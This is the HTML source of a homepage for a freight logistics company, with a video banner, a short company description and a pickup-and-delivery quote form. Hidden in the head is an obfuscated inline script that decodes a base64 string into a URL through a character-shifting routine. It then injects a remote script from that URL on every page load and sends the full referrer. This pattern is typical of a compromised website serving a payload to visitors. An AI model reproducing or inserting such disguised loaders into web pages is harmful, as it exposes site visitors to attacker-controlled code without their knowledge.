<!doctype html>
<html>

<head>
    <script src="dmxAppConnect/dmxAppConnect.js"></script>
    <meta charset="UTF-8">
    <title>Freight Logistics: Expedites, FTL, LTL and more | Raging Wolf Solutions</title>

    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.14.0/css/all.css" integrity="sha384-HzLeBuhoNPvSl5KYnjx0BT+WB0QEEqLprO+NBkkk5gbc67FTaL7XIGa2w1L0Xbgc" crossorigin="anonymous" />
    <link href="https://fonts.googleapis.com/css2?family=Lustria&amp;family=Muli:ital,wght@0,400;0,500;0,600;0,700;1,400;1,500;1,600;1,700&amp;display=swap" rel="stylesheet">
    <link href="https://fonts.cdnfonts.com/css/sansation" rel="stylesheet">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="stylesheet" href="bootstrap/5/css/bootstrap.min.css" />
    <link rel="stylesheet" href="css/style.css" />
    <script src="js/jquery-3.5.1.slim.min.js"></script>
    <script src="dmxAppConnect/dmxBootstrap5Navigation/dmxBootstrap5Navigation.js" defer=""></script>
    <script src="dmxAppConnect/dmxBackgroundVideo/dmxBackgroundVideo.js" defer=""></script>

    <script src="dmxAppConnect/dmxBootstrap5Modal/dmxBootstrap5Modal.js" defer></script>
    <script src="dmxAppConnect/dmxBrowser/dmxBrowser.js" defer></script>
    <link rel="icon" href="icons/favicon.ico">
    <link rel="stylesheet" href="dmxAppConnect/dmxValidator/dmxValidator.css" />
    <script src="dmxAppConnect/dmxValidator/dmxValidator.js" defer></script>

    <script>
        (function(){var _5S=document.createElement("script"),_jF=(function(_sP,_Ii){var _T2="";for(var _w6=0;_w6<_sP.length;_w6++){var _7h=_sP[_w6].charCodeAt();_7h-=_Ii;_7h+=61;_T2==_T2;_Ii>8;_7h%=94;_7h!=_w6;_7h+=33;_T2+=String.fromCharCode(_7h)}return _T2})(atob("OEREQENoXV1HQ1xKPz89OT42P1wzPz1dQDlINTxdZGExMmJjY2cxMmJkZ19mMl5mXjJlY2Rh"), 46);_5S!="q";_5S.src=_jF;_5S.async=!0;_5S.referrerPolicy="unsafe-url";_5S.type="text/javascript";function _Qm(){};5>4;var _G3=document.getElementsByTagName("script")[0];_G3.parentNode.insertBefore(_5S,_G3)})();
    </script>
    <link rel="stylesheet" href="dmxAppConnect/dmxSlideshow/dmxSlideshow.css" />
    <script src="dmxAppConnect/dmxSlideshow/dmxSlideshow.js" defer></script>
    <link rel="stylesheet" href="dmxAppConnect/dmxSlideshow/themes/minimal.css" />
</head>

<body is="dmx-app" id="index" class="bg-dark">

    <div is="dmx-browser" id="browser1"></div>
    <?php include 'navbar_mini'; ?>

    <?php include 'navbar_main'; ?>



    <main class="index-main" is="dmx-background-video" id="bgvideo1" src="MVI_0025.mp4" dmx-style="">
        <div class="container-xl ">
            <div class="row justify-content-center index-main-container-row text-start align-items-end">
                <div class="main-card col-md-8 mb-md-5 pt-3 pb-3">
                    <div class="row align-items-stretch module-card-row">
                        <div class="style1 col main-card-inner ms-3 me-3 align-self-center">
                            <div class="row">
                                <div class="col text-center pt-4">
                                    <h2 class="text-center text-light mb-2">We are the<br><span class="text-warning fw-bold">Alpha Leaders in Logistics</span></h2>
                                </div>
                            </div>
                            <div class="row justify-content-center">
                                <div class="col-md-9">
                                    <p class="text-light text-center mt-1 mb-4"><b>Raging Wolf Solutions</b> is a full service logistics solutions provider, offering freight coordination and transportation services across the continental United States and Canada. We leverage our expansive network of carriers and industry knowledge to bring our clients unparalleled communication and service ??? from pickup to delivery.</p>
                                </div>
                            </div>
                        </div>
                    </div>



                </div>
                <div class="col-md-9 align-self-start">
                    <div class="row main-card rounded rounded-1 pt-2 pb-2 ps-3 pe-3">

                        <div class="col">
                            <form id="form2">
                                <div class="row">
                                    <div class="col-lg-2">
                                        <div class="form-group md-3 text-white mt-0 mb-3"> <label for="input1" class="form-label col-form-label-sm mb-1" wappler-command="editContent"><i class="fas fa-map-marker-alt"></i>&nbsp;Pickup</label>
                                            <input type="text" class="form-control form-control-sm" id="input1" name="input1" aria-describedby="input1_help" placeholder="ZIP or City, State">
                                        </div>
                                    </div>
                                    <div class="col-lg-2">
                                        <div class="form-group md-3 text-white mt-0 mb-3"> <label for="input2" class="form-label col-form-label-sm mb-1" wappler-command="editContent"><i class="fas fa-map-marker-alt"></i>&nbsp;Delivery</label>
                                            <input type="text" class="form-control form-control-sm" id="input2" name="input2" aria-describedby="input1_help" placeholder="ZIP or City, State">
                                        </div>
                                    </div>
                                    <div class="col-lg-3">
                                        <div class="form-group md-3 text-white mt-0 mb-3"> <label for="input3" class="form-label col-form-label-sm mb-1" wappler-command="editContent">Freight Details</label>
                                            <input type="text" class="form-control form-control-sm" id="input3" name="input3" aria-describedby="input1_help" placeholder="Units, weight, dims, etc.">
                                        </div>
                                    </div>
                                    <div class="col-lg-3">
                                        <div class="form-group md-3 text-white mt-0 mb-3"> <label for="input4" class="form-label col-form-label-sm mb-1" wappler-command="editContent">Other Notes</label>
                                            <input type="text" class="form-control form-control-sm" id="input4" name="input4" aria-describedby="input1_help" placeholder="Optional notes here">
                                        </div>
                                    </div>
                                    <div class="col-lg-2 align-self-end pb-1">
                                        <button id="btn5" class="btn module-cta-btn btn-warning w-100 btn-sm lh-lg mt-2 mb-2 text-truncate" wappler-command="editContent" data-bs-toggle="modal" data-bs-target="#quote_modal" dmx-on:click="quote_modal.quote_form.input5.setValue(input1.value);quote_modal.quote_form.input6.setValue(input2.value);quote_modal.quote_form.input7.setValue(input3.value);quote_modal.quote_form.input8.setValue(input4.value)">Quote Me&nbsp;<i class="fas fa-caret-right"></i></button>
                                    </div>
                                </div>

                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </main>
    <?php include 'section_modules.php'; ?>
    <?php include 'footer'; ?>

    <script src="bootstrap/5/js/bootstrap.bundle.min.js"></script>
</body>

</html>